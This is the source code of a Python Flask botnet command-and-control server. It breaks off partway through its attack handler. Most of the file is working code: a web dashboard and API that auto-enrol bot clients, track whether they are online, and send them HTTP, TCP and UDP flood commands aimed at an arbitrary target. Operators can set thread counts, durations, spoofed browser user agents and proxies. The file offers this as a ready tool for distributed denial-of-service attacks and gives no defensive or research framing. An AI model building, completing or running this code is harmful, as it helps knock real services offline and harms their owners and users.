"""
JAVASCRIPT BOTNET C2 SERVER - JS ONLY
======================================
Features:
- Auto-approval system for JavaScript clients only
- Custom user agent management
- Optional proxy support
- Modern blue/black interface
- Resource-friendly operations
- JavaScript client compatibility
- Improved error handling

FIXES APPLIED:
1. Only JavaScript clients allowed
2. Fixed bot display in dashboard
3. Removed Python/Java support
4. Better online/offline detection

Run: python server.py [port]
Example: python server.py 5000
"""

import threading
import json
import time
import os
import sys
import traceback
from datetime import datetime
from functools import wraps
from typing import Dict, List, Any, Optional

try:
    from flask import Flask, render_template_string, request, jsonify, Response
    from flask_cors import CORS
    import atexit
except ImportError:
    print("[!] Install dependencies: pip install flask flask-cors")
    exit(1)

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# ========== CORS HEADERS FOR ALL ROUTES ==========
@app.after_request
def add_cors_headers(response):
    """Add CORS headers to all responses"""
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

# ========== HEALTH CHECK FOR RENDER ==========
@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint for Render.com"""
    return jsonify({
        'status': 'healthy',
        'server': 'javascript-c2-server',
        'time': datetime.now().isoformat(),
        'bots_count': len(approved_bots),
        'online_bots': sum(1 for b in approved_bots.values() if time.time() - b.get('last_seen', 0) < 30)
    })

# Global storage with thread safety
approved_bots: Dict[str, Dict] = {}
commands_queue: Dict[str, List] = {}
attack_logs: List[Dict] = []
user_agents: List[str] = [
    'JavaScript-Bot/1.0 (Node.js)',
    'Node.js Bot Client',
    'Mozilla/5.0 (compatible; JS-Bot)',
    'JS-HTTP-Client/1.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
]
proxy_list: List[str] = []

# Thread safety
bot_lock = threading.Lock()
log_lock = threading.Lock()
queue_lock = threading.Lock()

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>JavaScript C2 Control Panel</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #000000 0%, #0a1929 100%);
            color: #e3f2fd;
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            text-align: center;
            border: 2px solid #f7df1e;
            padding: 25px;
            margin-bottom: 25px;
            background: rgba(13, 27, 42, 0.9);
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(247, 223, 30, 0.2);
        }
        .header h1 { 
            font-size: 2.2em; 
            margin-bottom: 10px; 
            color: #f7df1e;
            text-shadow: 0 0 20px rgba(247, 223, 30, 0.5);
        }
        .header p { color: #fff9c4; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }
        .stat-box {
            border: 2px solid #f7df1e;
            padding: 20px;
            background: rgba(13, 27, 42, 0.9);
            text-align: center;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(247, 223, 30, 0.15);
            transition: all 0.3s ease;
        }
        .stat-box:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 24px rgba(247, 223, 30, 0.3);
        }
        .stat-box h3 { color: #f7df1e; margin-bottom: 10px; font-size: 0.9em; }
        .stat-box p { font-size: 2.2em; color: #fff9c4; font-weight: bold; }
        .section {
            border: 2px solid #f7df1e;
            padding: 25px;
            margin-bottom: 25px;
            background: rgba(13, 27, 42, 0.9);
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(247, 223, 30, 0.15);
        }
        .section h2 {
            color: #f7df1e;
            margin-bottom: 20px;
            border-bottom: 2px solid #f7df1e;
            padding-bottom: 12px;
            font-size: 1.3em;
        }
        .bot-list { display: grid; gap: 12px; }
        .bot-item {
            border: 1px solid #f7df1e;
            padding: 15px;
            background: rgba(13, 27, 42, 0.6);
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-radius: 8px;
            transition: all 0.3s ease;
        }
        .bot-item:hover {
            background: rgba(247, 223, 30, 0.15);
            transform: translateX(5px);
        }
        .bot-item.offline { 
            border-color: #546e7a; 
            color: #90a4ae;
            opacity: 0.7;
        }
        .bot-item.online { 
            border-color: #66bb6a;
            box-shadow: 0 0 10px rgba(102, 187, 106, 0.3);
        }
        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 8px;
        }
        .status-online { 
            background: #66bb6a; 
            box-shadow: 0 0 10px #66bb6a; 
            animation: pulse 2s infinite;
        }
        .status-offline { background: #546e7a; }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        .btn {
            background: #f7df1e;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-family: inherit;
            font-weight: 600;
            margin-left: 10px;
            border-radius: 6px;
            transition: all 0.3s ease;
        }
        .btn:hover { 
            background: #ffeb3b;
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(247, 223, 30, 0.4);
        }
        .btn-danger { background: #d32f2f; color: white; }
        .btn-danger:hover { background: #c62828; }
        .btn-success { background: #2e7d32; color: white; }
        .btn-success:hover { background: #1b5e20; }
        .btn-warning { background: #f57c00; color: white; }
        .btn-warning:hover { background: #ef6c00; }
        input, select, textarea, button {
            background: rgba(13, 27, 42, 0.8);
            border: 2px solid #f7df1e;
            color: #e3f2fd;
            padding: 12px;
            font-family: inherit;
            width: 100%;
            margin: 8px 0;
            border-radius: 6px;
            transition: all 0.3s ease;
        }
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #ffeb3b;
            box-shadow: 0 0 12px rgba(255, 235, 59, 0.3);
        }
        button {
            cursor: pointer;
            font-weight: 600;
            background: rgba(247, 223, 30, 0.2);
            color: #f7df1e;
        }
        button:hover { 
            background: #f7df1e;
            color: #000;
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(247, 223, 30, 0.3);
        }
        .form-group { margin-bottom: 18px; }
        .form-group label { 
            display: block; 
            margin-bottom: 8px;
            color: #fff9c4;
            font-weight: 500;
        }
        textarea { 
            min-height: 120px; 
            font-size: 13px;
            font-family: 'Courier New', monospace;
        }
        .log {
            max-height: 300px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.5);
            padding: 15px;
            border: 1px solid #f7df1e;
            border-radius: 6px;
        }
        .log-entry { 
            margin-bottom: 8px;
            padding: 6px;
            border-left: 3px solid #f7df1e;
            padding-left: 10px;
        }
        .success { color: #66bb6a; border-left-color: #66bb6a; }
        .error { color: #ef5350; border-left-color: #ef5350; }
        .warning { color: #ffa726; border-left-color: #ffa726; }
        .info { color: #f7df1e; border-left-color: #f7df1e; }
        .javascript-log { color: #f7df1e; border-left-color: #f7df1e; }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.3); }
        ::-webkit-scrollbar-thumb { 
            background: #f7df1e;
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover { background: #ffeb3b; }
        .no-bots {
            text-align: center;
            padding: 30px;
            color: #546e7a;
            font-size: 1.1em;
        }
        .command-preview {
            background: rgba(0, 0, 0, 0.3);
            padding: 10px;
            border-radius: 6px;
            margin-top: 10px;
            font-family: monospace;
            font-size: 0.9em;
            border: 1px solid #f7df1e;
        }
        .quick-commands {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin-bottom: 15px;
        }
        .bot-info {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 5px;
            font-size: 0.9em;
            color: #90caf9;
        }
        .bot-info-item {
            background: rgba(247, 223, 30, 0.1);
            padding: 4px 8px;
            border-radius: 4px;
            border: 1px solid rgba(247, 223, 30, 0.3);
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>JAVASCRIPT C2 CONTROL PANEL</h1>
        <p>JavaScript Only | Auto-Approval | Real-time Monitoring</p>
    </div>

    <div class="stats">
        <div class="stat-box">
            <h3>CONNECTED BOTS</h3>
            <p id="approved-bots">0</p>
        </div>
        <div class="stat-box">
            <h3>ONLINE BOTS</h3>
            <p id="online-bots">0</p>
        </div>
        <div class="stat-box">
            <h3>ACTIVE ATTACKS</h3>
            <p id="active-attacks">0</p>
        </div>
        <div class="stat-box">
            <h3>TOTAL COMMANDS</h3>
            <p id="total-commands">0</p>
        </div>
    </div>

    <div class="section">
        <h2>CONNECTED JAVASCRIPT BOTS</h2>
        <div id="approved-list" class="bot-list">
            <div class="no-bots">Waiting for JavaScript bot connections...</div>
        </div>
    </div>

    <div class="section">
        <h2>QUICK COMMANDS</h2>
        <div class="quick-commands">
            <button class="btn-success" onclick="sendPing()">PING ALL</button>
            <button class="btn-warning" onclick="sendSysInfo()">SYSINFO</button>
            <button class="btn-danger" onclick="stopAllAttacks()">STOP ALL</button>
            <button onclick="clearInactiveBots()">CLEAR OFFLINE</button>
            <button onclick="testConnection()">TEST CONNECTION</button>
        </div>
    </div>

    <div class="section">
        <h2>HTTP FLOOD ATTACK</h2>
        <div class="form-group">
            <label>Target URL:</label>
            <input type="text" id="http-target" placeholder="https://example.com">
        </div>
        <div class="form-group">
            <label>Threads per Bot (50-300):</label>
            <input type="number" id="http-threads" value="100" min="50" max="300">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="http-duration" value="60">
        </div>
        <div class="form-group">
            <label>Method:</label>
            <select id="http-method">
                <option value="GET">GET</option>
                <option value="POST">POST</option>
                <option value="HEAD">HEAD</option>
            </select>
        </div>
        <button onclick="launchHTTPFlood()" class="btn-danger">LAUNCH HTTP FLOOD</button>
        <div id="http-preview" class="command-preview" style="display: none;">
            <strong>Command Preview:</strong> Will be shown here...
        </div>
    </div>

    <div class="section">
        <h2>TCP/UDP FLOOD ATTACK</h2>
        <div class="form-group">
            <label>Target (host:port):</label>
            <input type="text" id="tcp-target" placeholder="example.com:80">
        </div>
        <div class="form-group">
            <label>Threads per Bot (50-200):</label>
            <input type="number" id="tcp-threads" value="75" min="50" max="200">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="tcp-duration" value="60">
        </div>
        <div class="form-group">
            <label>Attack Type:</label>
            <select id="attack-type">
                <option value="tcp">TCP Flood</option>
                <option value="udp">UDP Flood</option>
            </select>
        </div>
        <button onclick="launchTCPUDPFlood()" class="btn-danger">LAUNCH ATTACK</button>
    </div>

    <div class="section">
        <h2>MANAGE USER AGENTS</h2>
        <div class="form-group">
            <label>JavaScript User Agents (one per line):</label>
            <textarea id="user-agents" placeholder="JavaScript-Bot/1.0 (Node.js)"></textarea>
        </div>
        <button onclick="updateUserAgents()">UPDATE USER AGENTS</button>
    </div>

    <div class="section">
        <h2>ACTIVITY LOGS</h2>
        <div style="margin-bottom: 10px;">
            <button onclick="clearLogs()">CLEAR LOGS</button>
            <button onclick="exportLogs()">EXPORT LOGS</button>
            <button onclick="toggleAutoScroll()" id="auto-scroll-btn">AUTO SCROLL: ON</button>
        </div>
        <div id="logs" class="log"></div>
    </div>

    <script>
        let autoScroll = true;
        
        function toggleAutoScroll() {
            autoScroll = !autoScroll;
            document.getElementById('auto-scroll-btn').textContent = 'AUTO SCROLL: ' + (autoScroll ? 'ON' : 'OFF');
        }

        function updateStats() {
            fetch('/api/stats')
                .then(r => r.json())
                .then(data => {
                    // Update stats boxes
                    document.getElementById('approved-bots').textContent = data.approved_bots;
                    document.getElementById('online-bots').textContent = data.online_bots;
                    document.getElementById('active-attacks').textContent = data.active_attacks;
                    document.getElementById('total-commands').textContent = data.total_commands || 0;
                    
                    // Update user agents textarea
                    document.getElementById('user-agents').value = data.user_agents.join('\n');
                    
                    // Update bot list
                    const approvedList = document.getElementById('approved-list');
                    approvedList.innerHTML = '';
                    
                    if(data.approved.length === 0) {
                        approvedList.innerHTML = '<div class="no-bots">No JavaScript bots connected yet...</div>';
                    } else {
                        // Sort: online first, then by last seen
                        const sortedBots = [...data.approved].sort((a, b) => {
                            if (a.online && !b.online) return -1;
                            if (!a.online && b.online) return 1;
                            return 0;
                        });
                        
                        sortedBots.forEach(bot => {
                            const div = document.createElement('div');
                            const statusClass = bot.online ? 'online' : 'offline';
                            const statusIndicator = bot.online ? 'status-online' : 'status-offline';
                            
                            div.className = `bot-item ${statusClass}`;
                            div.innerHTML = `
                                <div>
                                    <div>
                                        <span class="status-indicator ${statusIndicator}"></span>
                                        <strong>[${bot.bot_id}]</strong>
                                        <span style="color: #f7df1e; margin-left: 8px;">JavaScript Client</span>
                                    </div>
                                    <div class="bot-info">
                                        <span class="bot-info-item">${bot.specs.os || 'unknown'} OS</span>
                                        <span class="bot-info-item">${bot.specs.cpu_cores || '?'} cores</span>
                                        <span class="bot-info-item">${bot.specs.ram_gb || '?'}GB RAM</span>
                                        <span class="bot-info-item">Status: <strong>${bot.status || 'idle'}</strong></span>
                                        <span class="bot-info-item">Last seen: ${bot.last_seen}</span>
                                    </div>
                                </div>
                                <button class="btn btn-danger" onclick="removeBot('${bot.bot_id}')">REMOVE</button>
                            `;
                            approvedList.appendChild(div);
                        });
                    }
                    
                    // Update logs
                    const logsDiv = document.getElementById('logs');
                    if(data.logs.length === 0) {
                        logsDiv.innerHTML = '<div style="text-align:center;color:#546e7a;">No activity yet</div>';
                    } else {
                        logsDiv.innerHTML = data.logs.slice(-30).reverse().map(log => {
                            const logClass = `${log.type} javascript-log`;
                            return `<div class="log-entry ${logClass}">[${log.time}] ${log.message}</div>`;
                        }).join('');
                        
                        if (autoScroll) {
                            logsDiv.scrollTop = logsDiv.scrollHeight;
                        }
                    }
                })
                .catch(err => console.error('Error fetching stats:', err));
        }

        function sendPing() {
            fetch('/api/command/ping', { 
                method: 'POST',
                headers: {'Content-Type': 'application/json'}
            })
            .then(r => r.json())
            .then(data => {
                alert(`Ping sent to ${data.sent_count || 0} JavaScript bots`);
                updateStats();
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Failed to send ping');
            });
        }

        function sendSysInfo() {
            fetch('/api/command/sysinfo', { 
                method: 'POST',
                headers: {'Content-Type': 'application/json'}
            })
            .then(r => r.json())
            .then(data => {
                alert(`Sysinfo sent to ${data.sent_count || 0} JavaScript bots`);
                updateStats();
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Failed to send sysinfo');
            });
        }

        function stopAllAttacks() {
            if(confirm('Stop all active attacks on all JavaScript bots?')) {
                fetch('/api/command/stop', { 
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'}
                })
                .then(r => r.json())
                .then(data => {
                    alert(`Stop command sent to ${data.sent_count || 0} JavaScript bots`);
                    updateStats();
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Failed to stop attacks');
                });
            }
        }

        function clearInactiveBots() {
            if(confirm('Clear all offline bots (last seen > 5 minutes)?')) {
                fetch('/api/clear/inactive', {method: 'POST'})
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        updateStats();
                    })
                    .catch(err => console.error('Error:', err));
            }
        }

        function testConnection() {
            fetch('/health')
                .then(r => r.json())
                .then(data => {
                    alert(`Server Status: ${data.status}\nConnected Bots: ${data.bots_count}\nOnline Bots: ${data.online_bots}`);
                })
                .catch(err => {
                    alert('Server connection failed: ' + err.message);
                });
        }

        function removeBot(botId) {
            if(confirm('Remove JavaScript bot: ' + botId + '?')) {
                fetch('/api/remove/' + botId, {method: 'POST'})
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        updateStats();
                    })
                    .catch(err => console.error('Error:', err));
            }
        }

        function updateUserAgents() {
            const agents = document.getElementById('user-agents').value;
            fetch('/api/user-agents', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ user_agents: agents })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Failed to update user agents');
            });
        }

        function launchHTTPFlood() {
            const target = document.getElementById('http-target').value;
            const duration = document.getElementById('http-duration').value;
            const threads = document.getElementById('http-threads').value;
            const method = document.getElementById('http-method').value;
            
            if (!target) {
                alert('Please enter target URL');
                return;
            }
            
            if(confirm(`Launch HTTP ${method} flood with ${threads} threads to ${target} for ${duration}s?`)) {
                fetch('/api/attack/http', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ target, duration, threads, method })
                })
                .then(r => r.json())
                .then(data => {
                    alert(data.message);
                    updateStats();
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Failed to launch attack');
                });
            }
        }

        function launchTCPUDPFlood() {
            const target = document.getElementById('tcp-target').value;
            const duration = document.getElementById('tcp-duration').value;
            const threads = document.getElementById('tcp-threads').value;
            const attackType = document.getElementById('attack-type').value;
            
            if (!target) {
                alert('Please enter target');
                return;
            }
            
            if(confirm(`Launch ${attackType.toUpperCase()} flood with ${threads} threads to ${target} for ${duration}s?`)) {
                const endpoint = attackType === 'tcp' ? '/api/attack/tcp' : '/api/attack/udp';
                fetch(endpoint, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ target, duration, threads })
                })
                .then(r => r.json())
                .then(data => {
                    alert(data.message);
                    updateStats();
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Failed to launch attack');
                });
            }
        }

        function clearLogs() {
            if(confirm('Clear all activity logs?')) {
                fetch('/api/logs/clear', { method: 'POST' })
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        updateStats();
                    })
                    .catch(err => console.error('Error:', err));
            }
        }

        function exportLogs() {
            fetch('/api/logs/export')
                .then(r => r.text())
                .then(data => {
                    const blob = new Blob([data], { type: 'text/plain' });
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `javascript-c2-logs-${new Date().toISOString().slice(0,10)}.txt`;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    window.URL.revokeObjectURL(url);
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Failed to export logs');
                });
        }

        // Update stats every 2 seconds
        setInterval(updateStats, 2000);
        updateStats();
        
        // Preview HTTP command
        const httpTarget = document.getElementById('http-target');
        const httpThreads = document.getElementById('http-threads');
        const httpPreview = document.getElementById('http-preview');
        
        function updateHTTPPreview() {
            if (httpTarget.value) {
                httpPreview.style.display = 'block';
                httpPreview.innerHTML = `
                    <strong>Command Preview:</strong><br>
                    Type: http_flood<br>
                    Target: ${httpTarget.value}<br>
                    Threads: ${httpThreads.value}<br>
                    Method: ${document.getElementById('http-method').value}<br>
                    Duration: ${document.getElementById('http-duration').value}s
                `;
            } else {
                httpPreview.style.display = 'none';
            }
        }
        
        httpTarget.addEventListener('input', updateHTTPPreview);
        httpThreads.addEventListener('input', updateHTTPPreview);
        document.getElementById('http-method').addEventListener('change', updateHTTPPreview);
        document.getElementById('http-duration').addEventListener('input', updateHTTPPreview);
    </script>
</body>
</html>
"""

# Decorators for thread safety
def synchronized(lock):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            with lock:
                return func(*args, **kwargs)
        return wrapper
    return decorator

def log_activity(message: str, log_type: str = 'info'):
    """Add log entry with thread safety"""
    with log_lock:
        log_entry = {
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': log_type,
            'message': message
        }
        attack_logs.append(log_entry)
        
        # Keep only last 1000 logs
        if len(attack_logs) > 1000:
            attack_logs.pop(0)

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/check_approval', methods=['POST', 'OPTIONS'])
def check_approval():
    """Auto-approve JavaScript bots only"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        if not data:
            return jsonify({'approved': False, 'error': 'No data'}), 400
            
        bot_id = data.get('bot_id')
        specs = data.get('specs', {})
        
        if not bot_id:
            return jsonify({'approved': False, 'error': 'No bot_id'}), 400
        
        current_time = time.time()
        
        # Force JavaScript client type
        client_type = 'javascript'
        
        with bot_lock:
            if bot_id not in approved_bots:
                approved_bots[bot_id] = {
                    'specs': specs,
                    'last_seen': current_time,
                    'status': 'connected',
                    'approved_at': current_time,
                    'client_type': client_type,
                    'stats': data.get('stats', {}),
                    'commands_received': 0
                }
                
                log_message = f'JavaScript bot connected: {bot_id} - {specs.get("os", "unknown")}'
                log_activity(log_message, 'success')
                print(f"[+] {log_message}")
            else:
                # Update last seen
                approved_bots[bot_id]['last_seen'] = current_time
                approved_bots[bot_id]['client_type'] = client_type
                if approved_bots[bot_id].get('status') == 'disconnected':
                    approved_bots[bot_id]['status'] = 'reconnected'
                    log_message = f'JavaScript bot reconnected: {bot_id}'
                    log_activity(log_message, 'success')
                    print(f"[+] {log_message}")
                else:
                    approved_bots[bot_id]['status'] = 'connected'
        
        return jsonify({'approved': True, 'client_type': client_type})
    except Exception as e:
        error_msg = f'Error in check_approval: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'approved': False, 'error': str(e)}), 500

@app.route('/commands/<bot_id>', methods=['GET', 'OPTIONS'])
def get_commands(bot_id):
    """Get commands for specific bot"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        current_time = time.time()
        
        with bot_lock:
            if bot_id in approved_bots:
                approved_bots[bot_id]['last_seen'] = current_time
                approved_bots[bot_id]['status'] = 'connected'
        
        with queue_lock:
            commands = commands_queue.get(bot_id, [])
            commands_queue[bot_id] = []  # Clear commands after sending
            
            # Update command count
            if bot_id in approved_bots and commands:
                approved_bots[bot_id]['commands_received'] = approved_bots[bot_id].get('commands_received', 0) + len(commands)
        
        return jsonify({'commands': commands})
    except Exception as e:
        error_msg = f'Error in get_commands for {bot_id}: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'commands': []}), 500

@app.route('/status', methods=['POST', 'OPTIONS'])
def receive_status():
    """Receive status updates from bots"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400
            
        bot_id = data.get('bot_id')
        status = data.get('status', 'unknown')
        message = data.get('message', '')
        
        with bot_lock:
            if bot_id in approved_bots:
                approved_bots[bot_id]['status'] = status
                approved_bots[bot_id]['last_seen'] = time.time()
                # Update stats if provided
                if 'stats' in data:
                    approved_bots[bot_id]['stats'] = data['stats']
        
        log_message = f"JavaScript bot {bot_id}: {status} - {message}"
        log_activity(log_message, status)
        
        print(f"[*] Status from {bot_id}: {status} - {message}")
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        error_msg = f'Error in receive_status: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/user-agents', methods=['GET', 'POST', 'OPTIONS'])
def manage_user_agents():
    """Manage user agents"""
    if request.method == 'OPTIONS':
        return '', 200
    
    global user_agents
    
    try:
        if request.method == 'POST':
            data = request.json
            agents_text = data.get('user_agents', '')
            new_agents = [line.strip() for line in agents_text.split('\n') if line.strip()]
            
            if new_agents:
                user_agents = new_agents
                log_activity(f'Updated {len(user_agents)} user agents', 'info')
                print(f"[+] Updated {len(user_agents)} user agents")
                return jsonify({'status': 'success', 'message': f'Updated {len(user_agents)} JavaScript user agents'})
            
            return jsonify({'status': 'error', 'message': 'No valid user agents provided'}), 400
        
        return jsonify({'user_agents': user_agents})
    except Exception as e:
        error_msg = f'Error in manage_user_agents: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/proxies', methods=['GET', 'POST', 'OPTIONS'])
def manage_proxies():
    """Manage proxies"""
    if request.method == 'OPTIONS':
        return '', 200
    
    global proxy_list
    
    try:
        if request.method == 'POST':
            data = request.json
            proxies_text = data.get('proxies', '')
            new_proxies = [line.strip() for line in proxies_text.split('\n') if line.strip()]
            
            proxy_list = new_proxies
            log_activity(f'Updated {len(proxy_list)} proxies', 'info')
            print(f"[+] Updated {len(proxy_list)} proxies")
            return jsonify({'status': 'success', 'message': f'Updated {len(proxy_list)} proxies'})
        
        return jsonify({'proxies': proxy_list})
    except Exception as e:
        error_msg = f'Error in manage_proxies: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/remove/<bot_id>', methods=['POST', 'OPTIONS'])
def remove_bot(bot_id):
    """Remove specific bot"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        with bot_lock:
            if bot_id in approved_bots:
                del approved_bots[bot_id]
                
                with queue_lock:
                    if bot_id in commands_queue:
                        del commands_queue[bot_id]
                
                log_message = f'JavaScript bot removed: {bot_id}'
                log_activity(log_message, 'error')
                print(f"[-] {log_message}")
                return jsonify({'status': 'success', 'message': f'JavaScript bot {bot_id} removed'})
        
        return jsonify({'status': 'error', 'message': 'Bot not found'}), 404
    except Exception as e:
        error_msg = f'Error in remove_bot: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/clear/inactive', methods=['POST', 'OPTIONS'])
def clear_inactive_bots():
    """Clear inactive bots"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        current_time = time.time()
        removed_count = 0
        
        with bot_lock:
            bots_to_remove = []
            for bot_id, info in list(approved_bots.items()):
                try:
                    last_seen = info.get('last_seen', 0)
                    time_diff = current_time - last_seen
                    if time_diff > 300:  # 5 minutes
                        bots_to_remove.append(bot_id)
                except:
                    continue
            
            for bot_id in bots_to_remove:
                del approved_bots[bot_id]
                
                with queue_lock:
                    if bot_id in commands_queue:
                        del commands_queue[bot_id]
                
                removed_count += 1
                log_message = f'Removed inactive JavaScript bot: {bot_id}'
                log_activity(log_message, 'warning')
                print(f"[-] {log_message}")
        
        return jsonify({'status': 'success', 'message': f'Removed {removed_count} inactive JavaScript bots'})
    except Exception as e:
        error_msg = f'Error in clear_inactive_bots: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/stats', methods=['GET', 'OPTIONS'])
def get_stats():
    """Get server statistics - SIMPLIFIED FOR JAVASCRIPT ONLY"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        current_time = time.time()
        online_bots = 0
        active_attacks = 0
        total_commands = 0
        
        with bot_lock:
            # Count online bots and active attacks
            for bot_id, info in approved_bots.items():
                try:
                    last_seen = info.get('last_seen', 0)
                    time_diff = current_time - last_seen
                    
                    if time_diff < 30:  # Online if seen in last 30 seconds
                        online_bots += 1
                        if info.get('status') == 'running':
                            active_attacks += 1
                        
                        total_commands += info.get('commands_received', 0)
                    else:
                        # Mark as offline
                        info['status'] = 'offline'
                except:
                    continue
        
        # Prepare approved list for display
        approved_list = []
        with bot_lock:
            for bot_id, info in approved_bots.items():
                try:
                    last_seen = info.get('last_seen', current_time)
                    is_online = (current_time - last_seen) < 30
                    
                    specs = info.get('specs', {})
                    status = info.get('status', 'unknown')
                    
                    approved_list.append({
                        'bot_id': bot_id,
                        'specs': {
                            'cpu_cores': specs.get('cpu_cores', '?'),
                            'ram_gb': specs.get('ram_gb', '?'),
                            'os': specs.get('os', 'unknown')
                        },
                        'status': status,
                        'last_seen': time.strftime('%H:%M:%S', time.localtime(last_seen)),
                        'online': is_online,
                        'client_type': 'javascript'
                    })
                except:
                    continue
        
        with log_lock:
            recent_logs = attack_logs[-50:]
        
        return jsonify({
            'approved_bots': len(approved_bots),
            'online_bots': online_bots,
            'javascript_clients': len(approved_bots),  # All are JavaScript
            'active_attacks': active_attacks,
            'total_commands': total_commands,
            'user_agents_count': len(user_agents),
            'approved': approved_list,
            'logs': recent_logs,
            'user_agents': user_agents,
            'proxies': proxy_list
        })
    except Exception as e:
        error_msg = f'Error in get_stats: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({
            'approved_bots': 0,
            'online_bots': 0,
            'javascript_clients': 0,
            'active_attacks': 0,
            'total_commands': 0,
            'user_agents_count': 0,
            'approved': [],
            'logs': [],
            'user_agents': [],
            'proxies': []
        }), 500

def get_online_bots():
    """Get list of online bot IDs"""
    current_time = time.time()
    online_bots = []
    
    with bot_lock:
        for bot_id, info in approved_bots.items():
            try:
                last_seen = info.get('last_seen', 0)
                if current_time - last_seen < 30:
                    online_bots.append(bot_id)
            except:
                continue
    
    return online_bots

@app.route('/api/attack/http', methods=['POST', 'OPTIONS'])
def launch_http_attack():
    """Launch HTTP flood attack"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        
        target = data.get('target')
        duration = int(data.get('duration', 60))
        threads = int(data.get('threads', 100))
        method = data.get('method', 'GET')
        
        if not target:
            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
        
        # Get online bots
        target_bots = get_online_bots()
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online JavaScript bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {
                    'type': 'http_flood',
                    'target': target,
                    'duration': duration,
                    'threads': threads,
                    'method': method,
                    'user_agents': user_agents,
                    'proxies': proxy_list
                }
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
